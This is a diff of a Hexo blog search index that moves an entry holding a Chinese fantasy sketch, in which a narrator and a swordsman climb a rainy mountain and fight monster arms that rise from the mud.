+    <url>/2023/08/04/%E5%BC%82%E4%B8%96%E7%95%8C%E8%A7%81%E9%97%BB%E5%BD%95(1)/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">
+我不想沉在无人问津的海底，只好把登顶作为我的理想
+</blockquote>
+<span id="more"></span>
+<p>  雨尚未停歇。<br />
+  派斯坦擦拭着手里白色的长刀，篝火噼啪的声音回响在山洞的深处。这里是海特山峰的林线，连绵不断的小雨让森林蔓延到极高的海拔，也让覆盖着土壤的地面化为泥沼。<br />
+  远处的乌云褪去了夜色，昭示着黎明的到来。<br />
+  “今天还要向上走吗？”我问道。<br />
+  派斯坦收起手中擦拭刀具的布，拿起一根架在篝火旁的粗树枝，上面还串着不明生物的肉，经过火焰的炙烤，让人分不出那黑色究竟是炭还是肉本来的颜色。<br />
+  他自顾自地吃了起来，并没有回答我的问题。看着派斯坦吃得津津有味，我也拿起一串，轻轻撕下一块放在嘴里。<br />
+  苦涩瞬间在嘴里爆开。炙烤后的肉几乎没有水分，让咀嚼变得十分困难，而且还散发着令人抗拒的味道，我实在难以吃下第二口，便把肉放回了篝火旁。<br />
+  派斯坦也不在乎，他只是向外走，将覆盖在洞口的枝条掀开一个小角，侧身站在洞穴边缘，小心翼翼地用眼睛观察外面的情况。稍许，他走了回来，开始收拾自己的包裹。<br />
+  天还只是蒙蒙亮，厚厚的黑云让光线变得更加黯淡。看到派斯坦要离开，我也开始收拾行囊。<br />
+  “山顶上究竟有什么东西，这么值得你探寻？”我看着派斯坦将煮开的热水倒进杯中，忍不住开口问道。<br />
+  “不知道。”派斯坦的回答十分简短。<br />
+  话音刚落，他带上避水斗笠，用长刀挑开枝条向外走去，我没来得及追问，只能快步跟着他走出洞穴。可刚走到泥土上我就迅速陷了下去，就好像这被雨水浸透的泥土要囫囵将我吞噬。我吃力地将脚拔出，却看到派斯坦也正十分困难地前进，我不禁感到担忧，何时才能到达这直耸入云的山巅？<br />
+  “轰——”一只紫黑色的手臂扬起一大片泥土，从离我们不远的地底伸了出来。这手臂近一人高，手掌能将我的头颅轻易抓起。恐惧填满了我的大脑，让我迅速向洞口跑去，可粘性极强的土壤死死的吸附住我的双腿，让我难以动弹。<br />
+  突然，那怪物手掌向派斯坦拍去，巨大的响声在我耳旁炸起，随后是溅起的泥水。一击不成，这手臂又开始蠕动，想要脱离泥沼的吸附，向派斯坦横扫过去。<br />
+  “铮——”长刀出鞘，白色的刀光迅速劈在紫黑色的手掌上，使得黑色的血管瞬间张开一个狰狞的裂缝，血液与碎肉迸溅在派斯坦的斗笠与披风上，而后被渐大的雨势冲洗干净。<br />
+  那手臂没了动静。<br />
+  我长舒一口气，却看到派斯坦切下怪物手臂的一块肌肉，在雨水中洗涤干净后装进包里。不愉快的早餐经历迅速涌上脑海，我感到胃中一阵翻涌。<br />
+  “这山这么危险，为什么还要坚持爬到山顶啊？”为了转移注意力，我又搬出今早的问题。<br />
+  ”不知道，“派斯坦将目光移向我，”可是山脚已经被不断上涨的岁月之海淹没，我到了半山腰，已经没有下山的余地了。我不想沉在无人问津的海底，只好把登顶作为我的理想。“<br />
+  我并不清楚山脚的情况，只能糊里糊涂地跟着派斯坦继续前行。这几小时的旅途并无危机，山脉也不陡峭，跟着上升的海拔，我们走到了一片旷野。<br />
+  雨水让能见度变得非常低，可前方似乎浮现出了白色的雪线，这意味着登顶之旅即将迈入新的阶段，而雪地也会比泥沼要好走一些。<br />
+  ”轰——“紫黑色的手臂擦着我的脸颊从地底冒出，巨大的冲击力把我掀翻在地。我惊慌地看向派斯坦，却发现他的身边也冒出了一只怪物手臂。<br />
+  我想从地上爬起，可是这次泥沼彻底将我粘在地面，倏地，我身边的那只怪物手臂在我眼前迅速放大，我用尽全身力气将自己的手臂抬起，想要抵挡这比我上半身还宽的手掌，却被深深地拍进泥沼当中。<br />
+  我听见了骨骼碎裂的声音，随后泥水灌进了我的耳朵。我感受到那怪物手掌正迅速握紧，因为周围的泥土正在不断地挤压我的身体。<br />
+  在意识消散之前，极力向外一瞥——<br />
+  我看见飘摇的风雪，看见垂暮的旷野，看见挥舞着长刀的派斯坦，用坚定驱散着孤单。</p>
+]]></content>
+      <categories>
+        <category>sketch</category>
+      </categories>
   </entry>
   <entry>
     <title>Hexo &amp; Next 博客配置与美化</title>
@@ -568,43 +646,5 @@ href="https://blog.csdn.net/maosidiaoxian/article/details/85220394">如何在Hex
       <tags>
         <tag>tech, Blog</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>异世界见闻录(1)</title>
-    <url>/2023/08/04/%E5%BC%82%E4%B8%96%E7%95%8C%E8%A7%81%E9%97%BB%E5%BD%95(1)/</url>
-    <content><![CDATA[<blockquote class="blockquote-center">
-我不想沉在无人问津的海底，只好把登顶作为我的理想
-</blockquote>
-<span id="more"></span>
-<p>  雨尚未停歇。<br />
-  派斯坦擦拭着手里白色的长刀，篝火噼啪的声音回响在山洞的深处。这里是海特山峰的林线，连绵不断的小雨让森林蔓延到极高的海拔，也让覆盖着土壤的地面化为泥沼。<br />
-  远处的乌云褪去了夜色，昭示着黎明的到来。<br />
-  “今天还要向上走吗？”我问道。<br />
-  派斯坦收起手中擦拭刀具的布，拿起一根架在篝火旁的粗树枝，上面还串着不明生物的肉，经过火焰的炙烤，让人分不出那黑色究竟是炭还是肉本来的颜色。<br />
-  他自顾自地吃了起来，并没有回答我的问题。看着派斯坦吃得津津有味，我也拿起一串，轻轻撕下一块放在嘴里。<br />
-  苦涩瞬间在嘴里爆开。炙烤后的肉几乎没有水分，让咀嚼变得十分困难，而且还散发着令人抗拒的味道，我实在难以吃下第二口，便把肉放回了篝火旁。<br />
-  派斯坦也不在乎，他只是向外走，将覆盖在洞口的枝条掀开一个小角，侧身站在洞穴边缘，小心翼翼地用眼睛观察外面的情况。稍许，他走了回来，开始收拾自己的包裹。<br />
-  天还只是蒙蒙亮，厚厚的黑云让光线变得更加黯淡。看到派斯坦要离开，我也开始收拾行囊。<br />
-  “山顶上究竟有什么东西，这么值得你探寻？”我看着派斯坦将煮开的热水倒进杯中，忍不住开口问道。<br />
-  “不知道。”派斯坦的回答十分简短。<br />
-  话音刚落，他带上避水斗笠，用长刀挑开枝条向外走去，我没来得及追问，只能快步跟着他走出洞穴。可刚走到泥土上我就迅速陷了下去，就好像这被雨水浸透的泥土要囫囵将我吞噬。我吃力地将脚拔出，却看到派斯坦也正十分困难地前进，我不禁感到担忧，何时才能到达这直耸入云的山巅？<br />
-  “轰——”一只紫黑色的手臂扬起一大片泥土，从离我们不远的地底伸了出来。这手臂近一人高，手掌能将我的头颅轻易抓起。恐惧填满了我的大脑，让我迅速向洞口跑去，可粘性极强的土壤死死的吸附住我的双腿，让我难以动弹。<br />
-  突然，那怪物手掌向派斯坦拍去，巨大的响声在我耳旁炸起，随后是溅起的泥水。一击不成，这手臂又开始蠕动，想要脱离泥沼的吸附，向派斯坦横扫过去。<br />
-  “铮——”长刀出鞘，白色的刀光迅速劈在紫黑色的手掌上，使得黑色的血管瞬间张开一个狰狞的裂缝，血液与碎肉迸溅在派斯坦的斗笠与披风上，而后被渐大的雨势冲洗干净。<br />
-  那手臂没了动静。<br />
-  我长舒一口气，却看到派斯坦切下怪物手臂的一块肌肉，在雨水中洗涤干净后装进包里。不愉快的早餐经历迅速涌上脑海，我感到胃中一阵翻涌。<br />
-  “这山这么危险，为什么还要坚持爬到山顶啊？”为了转移注意力，我又搬出今早的问题。<br />
-  ”不知道，“派斯坦将目光移向我，”可是山脚已经被不断上涨的岁月之海淹没，我到了半山腰，已经没有下山的余地了。我不想沉在无人问津的海底，只好把登顶作为我的理想。“<br />
-  我并不清楚山脚的情况，只能糊里糊涂地跟着派斯坦继续前行。这几小时的旅途并无危机，山脉也不陡峭，跟着上升的海拔，我们走到了一片旷野。<br />
-  雨水让能见度变得非常低，可前方似乎浮现出了白色的雪线，这意味着登顶之旅即将迈入新的阶段，而雪地也会比泥沼要好走一些。<br />
-  ”轰——“紫黑色的手臂擦着我的脸颊从地底冒出，巨大的冲击力把我掀翻在地。我惊慌地看向派斯坦，却发现他的身边也冒出了一只怪物手臂。<br />
-  我想从地上爬起，可是这次泥沼彻底将我粘在地面，倏地，我身边的那只怪物手臂在我眼前迅速放大，我用尽全身力气将自己的手臂抬起，想要抵挡这比我上半身还宽的手掌，却被深深地拍进泥沼当中。<br />
-  我听见了骨骼碎裂的声音，随后泥水灌进了我的耳朵。我感受到那怪物手掌正迅速握紧，因为周围的泥土正在不断地挤压我的身体。<br />
-  在意识消散之前，极力向外一瞥——<br />
-  我看见飘摇的风雪，看见垂暮的旷野，看见挥舞着长刀的派斯坦，用坚定驱散着孤单。</p>
-]]></content>
-      <categories>
-        <category>sketch</category>
-      </categories>
   </entry>
 </search>
